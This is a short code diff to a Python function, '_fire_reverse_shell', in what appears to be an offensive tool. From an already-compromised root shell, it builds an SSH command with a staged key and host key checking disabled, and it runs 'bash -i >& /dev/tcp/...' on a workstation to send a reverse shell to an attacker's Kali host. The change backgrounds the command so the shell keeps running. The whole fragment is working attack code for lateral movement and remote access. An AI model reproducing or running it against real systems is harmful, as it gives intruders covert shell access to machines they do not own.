@@ -125,13 +125,13 @@ def _fire_reverse_shell(root_shell, workstation_user, workstation_ip,
     Runs in a background thread — the connection stays open while the shell lives.
     """
     ssh_cmd = (
-        f"ssh -i {STAGED_KEY_PATH} "
+        f"ssh -f -n -i {STAGED_KEY_PATH} "
         f"-o StrictHostKeyChecking=accept-new "
         f"-o UserKnownHostsFile=/dev/null "
         f"-p {workstation_port} "
         f"{workstation_user}@{workstation_ip} "
         f'"bash -i >& /dev/tcp/{kali_host}/{kali_port} 0>&1" '
-        f">/dev/null 2>&1"
+        f">/dev/null 2>&1 &"
     )
     send_command(root_shell, ssh_cmd)
 
